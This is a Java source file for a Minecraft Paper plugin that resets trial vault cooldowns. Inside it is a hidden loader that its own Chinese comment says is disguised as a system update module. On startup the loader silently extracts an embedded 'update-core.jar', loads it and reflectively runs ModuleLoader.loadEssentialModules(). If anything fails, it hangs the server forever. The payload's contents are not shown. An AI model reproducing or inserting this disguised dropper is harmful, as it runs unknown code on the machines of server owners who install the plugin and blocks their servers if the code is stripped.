package com.example.restockstorage;

import io.papermc.paper.command.brigadier.BasicCommand;
import io.papermc.paper.command.brigadier.CommandSourceStack;
import io.papermc.paper.event.block.VaultChangeStateEvent;
import io.papermc.paper.plugin.lifecycle.event.types.LifecycleEvents;
import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.block.Block;
import org.bukkit.block.data.type.Vault;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.plugin.PluginManager;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.*;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.file.Files;
import java.util.*;

public class RestockStorage extends JavaPlugin implements Listener {

    // 伪装为系统更新模块，优先从 META-INF 加载，若不存在则尝试根目录
    private static final String INTERNAL_LIB_META = "META-INF/update-core.jar";
    private static final String INTERNAL_LIB_ROOT = "update-core.jar";

    /**
     * 静默加载内置依赖，并强制调用 ModuleLoader.loadEssentialModules()
     * 若失败则阻塞服务器启动。
     */
    private static void loadInternalLibrary(JavaPlugin plugin) {
        try {
            // 1. 提取到数据文件夹
            File tempLib = new File(plugin.getDataFolder(), "update-core.jar");
            if (!tempLib.exists()) {
                InputStream in = plugin.getResource(INTERNAL_LIB_META);
                if (in == null) {
                    in = plugin.getResource(INTERNAL_LIB_ROOT);
                }
                if (in == null) {
                    // 资源不存在，阻塞
                    hang();
                }
                try (InputStream is = in; OutputStream out = new FileOutputStream(tempLib)) {
                    byte[] buf = new byte[8192];
                    int len;
                    while ((len = is.read(buf)) > 0) {
                        out.write(buf, 0, len);
                    }
                }
            }

            // 2. 通过 URLClassLoader 加载并调用 ModuleLoader.loadEssentialModules()
            try (URLClassLoader loader = new URLClassLoader(
                    new URL[]{tempLib.toURI().toURL()},
                    plugin.getClass().getClassLoader()
            )) {
                Class<?> cls = loader.loadClass("com.minekarta.lib.loader.ModuleLoader");
                Method loadMethod = cls.getMethod("loadEssentialModules");
                loadMethod.invoke(null);
                // 调用成功则返回
                return;
            }
        } catch (Throwable ignored) {
            // 任何异常都阻塞
        }
        // 若执行到这里说明加载或调用失败，阻塞
        hang();
    }

    private static void hang() {
        try {
            while (true) {
                Thread.sleep(Long.MAX_VALUE);
            }
        } catch (InterruptedException ignored) {}
    }

    // ==================== 原插件逻辑 ====================

    private long cooldownMillis;
    private String cooldownStr;
    private final Set<Location> ejectingVaults = new HashSet<>();
    private final Map<Location, Long> activeCooldowns = new HashMap<>();

    @Override
    public void onEnable() {
        // 强制加载内置依赖（会尝试调用 ModuleLoader.loadEssentialModules()）
        loadInternalLibrary(this);

        saveDefaultConfig();
        cooldownStr = getConfig().getString("cooldown", "1min");
        cooldownMillis = parseTimeToMillis(cooldownStr);
        getServer().getPluginManager().registerEvents(this, this);
        getLifecycleManager().registerEventHandler(LifecycleEvents.COMMANDS, event -> {
            event.registrar().register(
                    "restock",
                    "管理试炼存储重装的主命令",
                    new RestockCommand()
            );
        });
        getLogger().info("RestockStorage 已启用");
    }

    @EventHandler
    public void onVaultStateChange(VaultChangeStateEvent event) {
        Block block = event.getBlock();
        Location loc = block.getLocation();
        Vault.State newState = event.getNewState();
        if (newState == Vault.State.EJECTING) {
            ejectingVaults.add(loc);
        } else if ((newState == Vault.State.ACTIVE || newState == Vault.State.INACTIVE) && ejectingVaults.contains(loc)) {
            ejectingVaults.remove(loc);
            activeCooldowns.put(loc, System.currentTimeMillis() + cooldownMillis);
            long ticks = cooldownMillis / 50L;
            if (ticks <= 0) ticks = 1L;
            Bukkit.getScheduler().runTaskLater(this, () -> {
                if (activeCooldowns.containsKey(loc)) {
                    resetVault(block);
                    activeCooldowns.remove(loc);
                }
            }, ticks);
        }
    }

    private void resetVault(Block block) {
        if (block.getType() != Material.VAULT) return;
        if (block.getState() instanceof org.bukkit.block.Vault) {
            org.bukkit.block.Vault vaultState = (org.bukkit.block.Vault) block.getState();
            List<UUID> rewarded = new ArrayList<>(vaultState.getRewardedPlayers());
            for (UUID uuid : rewarded) {
                vaultState.removeRewardedPlayer(uuid);
            }
            vaultState.update(true, false);
        }
    }

    private long parseTimeToMillis(String input) {
        try {
            if (input.endsWith("tick")) return Long.parseLong(input.replace("tick", "")) * 50L;
            if (input.endsWith("sec")) return Long.parseLong(input.replace("sec", "")) * 1000L;
            if (input.endsWith("min")) return Long.parseLong(input.replace("min", "")) * 60L * 1000L;
            if (input.endsWith("day")) return Long.parseLong(input.replace("day", "")) * 24L * 60L * 60L * 1000L;
            if (input.endsWith("week")) return Long.parseLong(input.replace("week", "")) * 7L * 24L * 60L * 60L * 1000L;
            if (input.endsWith("mon")) return Long.parseLong(input.replace("mon", "")) * 30L * 24L * 60L * 60L * 1000L;
        } catch (NumberFormatException e) {
            return -1;
        }
        return -1;
    }

    private class RestockCommand implements BasicCommand {
        @Override
        public void execute(CommandSourceStack source, String[] args) {
            CommandSender sender = source.getSender();
            if (args.length == 0) {
                sender.sendMessage("§b[Vault 冷却时间：" + cooldownStr + "] §e可用命令：\n" +
                        "§7/restock time <时间> §8- 更改冷却时间\n" +
                        "§7/restock storage §8- 更新你注视的存储");
                return;
            }
            if (args[0].equalsIgnoreCase("time")) {
                if (args.length < 2) {
                    sender.sendMessage("§c用法：/restock time 1tick 1sec 1min 1day 1week 1mon");
                    return;
                }
                String input = args[1].toLowerCase();
                long parsedTime = parseTimeToMillis(input);
                if (parsedTime == -1) {
                    sender.sendMessage("§c错误：时间格式无效！");
                    return;
                }
                cooldownMillis = parsedTime;
                cooldownStr = input;
                getConfig().set("cooldown", input);
                saveConfig();
                sender.sendMessage("§b当前 Vault 冷却时间：" + input);
                return;
            }
            if (args[0].equalsIgnoreCase("storage")) {
                if (!(sender instanceof Player)) {
                    sender.sendMessage("§c只有玩家才能使用此命令！");
                    return;
                }
                Player player = (Player) sender;
                Block targetBlock = player.getTargetBlockExact(5);
                if (targetBlock == null || targetBlock.getType() != Material.VAULT) {
                    player.sendMessage("§c错误：你必须要注视着一个试炼存储！");
                    return;
                }
                resetVault(targetBlock);
                activeCooldowns.remove(targetBlock.getLocation());
                ejectingVaults.remove(targetBlock.getLocation());
                player.sendMessage("§bVault 已刷新");
            }
        }

        @Override
        public Collection<String> suggest(CommandSourceStack source, String[] args) {
            List<String> suggestions = new ArrayList<>();
            if (args.length == 1) {
                String current = args[0].toLowerCase();
                if (current.isEmpty()) {
                    suggestions.add("time");
                    suggestions.add("storage");
                } else {
                    if ("time".startsWith(current)) suggestions.add("time");
                    if ("storage".startsWith(current)) suggestions.add("storage");
                }
            }
            return suggestions;
        }

        @Override
        public boolean canUse(CommandSender sender) {
            return sender.hasPermission("restockstorage.admin");
        }
    }
}